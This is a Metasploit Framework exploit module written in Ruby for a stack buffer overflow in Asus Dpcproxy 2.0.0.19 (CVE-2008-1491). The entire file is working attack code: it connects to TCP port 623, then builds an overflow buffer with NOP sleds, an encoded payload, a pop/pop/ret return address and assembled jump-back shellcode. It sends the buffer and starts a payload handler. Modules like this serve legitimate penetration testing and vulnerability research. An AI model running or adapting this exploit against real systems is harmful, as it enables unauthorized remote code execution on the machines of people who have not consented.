	##
	# $Id$
	##
	
	##
	# This file is part of the Metasploit Framework and may be subject to
	# redistribution and commercial restrictions. Please see the Metasploit
	# Framework web site for more information on licensing and terms of use.
	# http://metasploit.com/projects/Framework/
 	##
 	
 	
 	require 'msf/core'
 	
 	module Msf
 	
 	class Exploits::Windows::Misc::Asus_Dpcproxy_Overflow< Msf::Exploit::Remote
 	
 	        include Exploit::Remote::Tcp
 	
 	        def initialize(info = {})
 	                super(update_info(info,
 	                        'Name'           => 'Asus Dpcproxy Buffer Overflow',
 	                        'Description'    => %q{
 	                                        This module exploits a stack overflow in Asus Dpcroxy version 2.0.0.19.
 	                                        It should be vulnerable until version 2.0.0.24.
 	                                        Credit to Luigi Auriemma
 	                        },
 	                        'Author'         => 'Jacopo Cervini',
 	                        'Version'        => '$Revision$',
 	                        'References'     =>
 	                                [
 	                                        [ 'CVE', '2008-1491' ],
 	                                        [ 'BID', '28394' ],
 	                                        [ 'OSVDB', '43638' ],
 	                                ],
 	                        'DefaultOptions' =>
 	                                {
 	                                        'EXITFUNC' => 'process',
 	                                },
 	                        'Payload'        =>
 	                                {
 	                                        'Space'    => 400,
 	                                        'BadChars' => "\x07\x08\x0d\x0e\x0f\x7e\x7f\xff",
 	                                },
 	                        'Platform'       => 'win',
 	                        'Targets'        =>
 	                                [
 	                                        [ 'Asus Dpcroxy version 2.00.19 Universal',     { 'Ret' => 0x0040273b } ], # p/p/r
 	                                ],
 	                        'Privileged'     => true,
 	                        'DefaultTarget'  => 0,
 	                        'DisclosureDate' => 'March 21 2008'))
 	
 	                        register_options([Opt::RPORT(623)], self.class)
 	
 	        end
 	
 	        def exploit
 	                connect
 	
 	                sploit =   make_nops(0x38a - payload.encoded.length)+ payload.encoded + rand_text_english(6032)
 	                sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2)
 	                sploit << [target.ret].pack('V') +  make_nops(8) + Metasm::Shellcode.assemble(Metasm::Ia32.new, "add bh,6 add bh,6 add bh,2 push ebx ret").encode_string #jmp back
 	                sploit << make_nops(50)
 	
 	                print_status("Trying target #{target.name}...")
 	                sock.put(sploit)
 	                sleep(3) # =(
 	
 	                handler
 	                disconnect
 	        end
 	
 	end
 	end